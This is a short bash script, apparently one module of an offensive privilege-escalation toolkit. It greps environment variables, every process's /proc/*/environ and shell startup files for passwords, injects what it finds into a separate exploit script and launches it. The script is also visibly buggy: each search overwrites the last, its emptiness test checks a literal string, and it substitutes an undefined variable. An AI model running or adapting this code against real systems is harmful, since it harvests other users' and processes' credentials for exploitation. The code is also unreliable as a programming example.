#! /bin/bash
# Environmental variable scan

exploitable_passwords=''
EXPLOIT=0
VERBOSE=0

# Find environment variables with passwords-related names

#   The env command list
exploitable_passwords=$(env | grep -i 'password')

#   Call set check all variables
exploitable_passwords=$(set | grep -i 'password')

#   Check process environment
exploitable_passwords=$(grep -i 'password' /proc/*/environ 2>/dev/null)

#   Check for env vars in user-startup scripts
exploitable_passwords=$(grep -i 'password' ~/.bash_profile /etc/environment /etc/profile)

# Makes exploitable_passwords accessible to exploit
if [[ -z exploitable_passwords ]]; then
    # There were no exploitable passwords
    test $EXPLOIT != 0 && print_verbosity "Not exploitable, skipping exploit." 0
    exit 0
else
    sed -i "s#exploitable_passwords\=.*#exploitable_passwords\=${exploitable_paths}#g" exploits/env-var-exploit.sh
    print_verbosity "Environmental variables with passwords found!" 1
    run_exploit "env-var"
fi
